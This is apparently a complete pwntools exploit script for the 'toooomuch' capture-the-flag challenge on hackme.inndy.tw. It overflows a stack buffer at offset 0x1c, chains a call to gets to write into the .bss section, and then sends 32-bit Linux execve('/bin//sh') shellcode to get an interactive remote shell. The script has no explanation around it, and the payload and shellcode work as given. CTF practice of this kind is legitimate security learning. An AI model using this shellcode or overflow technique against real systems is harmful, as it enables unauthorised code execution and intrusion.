from pwn import *
context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])
target = remote('hackme.inndy.tw', 7702)
elf = ELF('./toooomuch')
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"
payload = fit({0x1c:[p32(elf.plt['gets']),p32(elf.bss()),p32(elf.bss())]})
target.sendlineafter('your passcode: ',payload)
target.sendline(shellcode)
target.interactive()